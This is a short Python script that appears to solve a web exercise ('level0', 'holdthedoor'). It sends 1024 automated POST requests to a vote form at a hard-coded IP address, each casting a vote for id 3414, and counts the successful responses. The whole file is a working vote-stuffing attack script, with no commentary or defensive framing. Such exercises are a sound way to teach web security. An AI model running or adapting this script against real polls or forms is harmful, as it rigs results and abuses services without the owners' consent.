#!/usr/bin/python3
import requests

success_votes = 0
number_print = 1024
votation = {'id': '3414', 'holdthedoor': 'Submit'}

for i in range(0, 1024):
    r = requests.post('http://158.69.76.135/level0.php', data=votation)
    if r.status_code == 200:
        success_votes +=1

print("print success: {}".format(success_votes))
